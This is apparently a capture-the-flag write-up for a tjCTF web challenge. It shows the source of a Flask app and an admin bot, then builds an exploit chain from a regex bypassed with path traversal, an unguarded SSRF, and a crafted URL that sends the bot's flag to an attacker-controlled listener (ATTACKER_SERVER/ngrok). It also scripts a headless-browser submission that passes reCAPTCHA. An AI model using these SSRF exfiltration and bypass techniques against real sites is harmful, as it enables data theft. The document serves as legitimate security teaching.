# Chained — tjCTF 2026 Web Challenge

## Challenge Description

> I designed my own admin bot! And I included an admin page that should be super duper secure...

**Category:** Web  
**Difficulty:** Medium  
**Flag:** `tjctf{ch41n3d_o340e934l35d}`

We are given a web application with two components:
- A main Flask app running on `https://chained.tjc.tf:5000`
- An admin bot service at `https://admin-bot.tjctf.org/chained`
- Source code: `app.py`, `admin-bot.js`, `index.html`

---

## Source Code Analysis

### `app.py` — The Main Server

```python
from flask import Flask, request, render_template, redirect, url_for
import requests

app = Flask(__name__)

def isSafe(url):
    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0',
               '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}
    return all([i not in url.lower() for i in blacklist])

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url'] or ''
        if not isSafe(url):
            return 'Access denied.'
        return redirect(url_for('index', url=url))
    url = request.args.get('url') or ''
    if url:
        desc = 'The admin will visit your URL.'
        try:
            req = 'Your response: ' + requests.get(url).text
        except:
            return 'Uh-oh... Try again!'
    else:
        req, desc = '', ''
    return render_template('index.html', q=req, desc=desc)

@app.route('/admin')
def js():
    if request.remote_addr != '127.0.0.1':
        return 'Access denied. Page only accessible from server side.'
    query = request.args.get("q", "")
    return query, 200, {'Content-Type': 'application/javascript'}
```

#### Key observations:

1. **SSRF with incomplete blacklist (`isSafe`)** — The `isSafe()` function blocks `127`, `local`, `0x`, `::1`, etc., but is only called in the **POST** handler. The **GET** handler fetches any URL without any validation.

2. **Reflected HTML injection via `| safe`** — The template renders `req` (which contains the SSRF response) with `| safe`, allowing arbitrary HTML/script injection. However, the page has a CSP that blocks inline scripts.

3. **IP-restricted JS endpoint** — `/admin` returns the `q` query parameter with `Content-Type: application/javascript`, but only for requests originating from `127.0.0.1`.

### `admin-bot.js` — The Bot

```javascript
import flag from './flag.txt';

export default {
    id: 'chained',
    name: 'chained',
    urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);
    }
};
```

#### Key observations:

1. **Regex without `$` anchor** — The URL must *start* with `https://chained.tjc.tf/admin/` but there's no end-of-string anchor. Path traversal like `/admin/../../` passes the check.

2. **Flag appended to URL** — The bot concatenates `url + flag` and navigates there. The flag ends up in the final URL as a query parameter value or path component.

### `index.html` — CSP Configuration

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self';
               img-src 'none'; object-src 'none'; manifest-src 'none';">
```

- `script-src 'self'` — Inline scripts are **blocked**; only same-origin scripts execute.
- `form-action` — NOT set, so form submissions to any origin are allowed (CSP doesn't restrict `form-action` by default).

---

## Vulnerability Chain

The challenge name "Chained" hints that multiple vulnerabilities must be linked together:

1. **Path Traversal Bypass** of admin bot URL regex
2. **Full SSRF via GET handler** (no blacklist)  
3. **SSRF to exfiltrate data** using the server as a proxy

### Why XSS via `<script>` won't work directly

The CSP has `script-src 'self'`, which blocks inline `<script>` tags. The `/admin` endpoint (which returns arbitrary JS) is IP-restricted to localhost. The browser can't load it directly as a script source since non-localhost requests get "Access denied."

### Why SSRF Exfiltration is the Clean Approach

Instead of fighting CSP, we observe that:

1. The admin bot navigates to `url + flag`
2. The URL it visits is the main app's `/` endpoint (via path traversal)
3. The GET handler performs SSRF on whatever URL is in the `url` parameter
4. The `url` parameter contains the flag (appended by the bot)

So if we make the SSRF fetch **our own server** with the flag in the query string, the server's request to our server will contain the flag.

---

## Exploit Construction

### Step 1: Craft the Bot URL

```
https://chained.tjc.tf/admin/../../?url=https://ATTACKER_SERVER/collect?flag=
```

- `https://chained.tjc.tf/admin/../../` — Matches the bot's regex (starts with `https://chained.tjc.tf/admin/`)
- Browsers normalize `/admin/../../` → `/`, routing the request to the main page
- `?url=https://ATTACKER_SERVER/collect?flag=` — The SSRF target; `flag=` is left dangling so the bot's flag appends to it

### Step 2: What Happens at Runtime

```
Bot input URL:   https://chained.tjc.tf/admin/../../?url=https://ATTACKER_SERVER/collect?flag=
Bot navigates to: [input URL] + [flag]
                 = https://chained.tjc.tf/admin/../../?url=https://ATTACKER_SERVER/collect?flag=tjctf{...}

Browser normalizes path: https://chained.tjc.tf/?url=https://ATTACKER_SERVER/collect?flag=tjctf{...}

Flask GET handler:
  url_param = "https://ATTACKER_SERVER/collect?flag=tjctf{...}"
  requests.get("https://ATTACKER_SERVER/collect?flag=tjctf{...}")  ← SSRF to our server!

Our server receives: GET /collect?flag=tjctf{ch41n3d_o340e934l35d}
```

### Step 3: Set Up a Listener

We used **ngrok** to expose a local HTTP server publicly:

```bash
# Terminal 1: Start a Python HTTP server
python3 -m http.server 13337

# Terminal 2: Expose it via ngrok
ngrok http 13337
```

This gives us a public URL like `https://xxxx.ngrok-free.app`.

### Step 4: Submit the URL to the Admin Bot

The admin bot uses reCAPTCHA v3, which is invisible. Using Selenium (headless Chrome), the reCAPTCHA resolves automatically:

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument('--headless=new')
driver = webdriver.Chrome(options=options)

ngrok_url = 'https://xxxx.ngrok-free.app'
submit_url = f'https://chained.tjc.tf/admin/../../?url={ngrok_url}/collect?flag='

driver.get('https://admin-bot.tjctf.org/chained')
driver.find_element('name', 'url').send_keys(submit_url)
driver.find_element('tag name', 'button').click()
# reCAPTCHA v3 auto-resolves; form submits
```

---

## Flag Capture

A few seconds after submission, the ngrok dashboard shows:

```
GET /collect?flag=tjctf%7Bch41n3d_o340e934l35d%7D HTTP/1.1
Host: xxxx.ngrok-free.app
User-Agent: python-requests/2.32.4
X-Forwarded-For: 35.185.47.22
```

URL-decoded: **`tjctf{ch41n3d_o340e934l35d}`**

---

## Summary

| Vulnerability | Bypass |
|---|---|
| Bot URL regex `^https://chained.tjc.tf/admin//` | Path traversal `/admin/../../` (no `$` anchor) |
| SSRF blacklist (`isSafe`) | Only enforced on POST; bot navigates via GET which has no blacklist |
| IP restriction on `/admin` | Not needed — we exfiltrate via SSRF directly, not through `/admin` |
| CSP blocking inline scripts | Not needed — we use SSRF to exfiltrate, not XSS |
| reCAPTCHA protection | reCAPTCHA v3 is invisible and auto-resolves in headless Chrome |

The core insight: the **GET handler's SSRF is completely unguarded** (no `isSafe` call), and the bot appends the flag to the URL. By making the SSRF target *our own server*, the flag travels from the bot's URL through the server's `requests.get()` directly to us.
